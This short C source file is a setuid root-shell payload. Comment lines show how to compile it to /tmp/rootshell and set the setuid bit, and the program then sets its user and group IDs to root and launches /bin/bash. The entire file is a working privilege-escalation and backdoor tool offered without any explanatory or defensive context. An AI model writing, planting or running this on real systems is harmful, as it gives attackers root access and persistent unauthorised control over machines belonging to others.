// gcc -o /tmp/rootshell /tmp/rootshell.c
// chmod u+s /tmp/rootshell

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}